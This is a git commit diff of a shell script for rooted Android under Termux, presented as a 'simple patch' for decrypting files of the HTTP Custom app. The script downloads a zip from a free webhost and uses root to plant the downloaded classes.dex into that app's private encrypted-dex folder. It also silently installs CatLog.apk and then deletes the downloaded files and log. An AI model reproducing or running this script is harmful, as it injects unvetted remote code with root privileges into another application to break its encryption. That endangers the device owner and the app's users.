7d42f1b26484e966791ca2b37e384cc2251095c9
Rodrigo Alvarez <43616347+navrod@users.noreply.github.com>
2020-10-23 17:38:22 -0400

    Update sniffbeta.sh

--- sniffbeta.sh
+++ sniffbeta.sh
@@ -1,14 +1,14 @@
-clear
+
 cd ~
 rm awmeme.zip
 clear
 echo "http custom v233 simple patch for  decrypting file"
 echo "require root permission, please allow the dialog!"
 wget http://hc233test.000webhostapp.com/awmeme.zip >> log.txt
-clear
+
 apt install unzip
 unzip -o awmeme.zip >> log.txt
-clear
+
 su -c 'mkdir /data/data/xyz.easypro.httpcustom/app_eCrypt_dex >>/dev/null & cp  /data/data/com.termux/files/home/classes.dex /data/data/xyz.easypro.httpcustom/app_eCrypt_dex/classes.dex & chmod 0555 /data/data/xyz.easypro.httpcustom/app_eCrypt_dex & chmod 0555 /data/data/xyz.easypro.httpcustom/app_eCrypt_dex/classes.dex &sleep 3& cp /data/data/com.termux/files/home/CatLog.apk /sdcard/CatLog.apk & su -c "pm install /sdcard/CatLog.apk" >> /dev/null&& echo "echo ok"' >> log.txt
 sleep 5
 su -c 'su -c "#rm /sdcard/CatLog.apk & rm /data/data/com.termux/files/home/classes.dex & #rm /data/data/com.termux/files/home/CatLog.apk& rm /data/data/com.termux/files/home/awmeme.zip& rm /data/data/com.termux/files/home/log.txt" &echo " "'
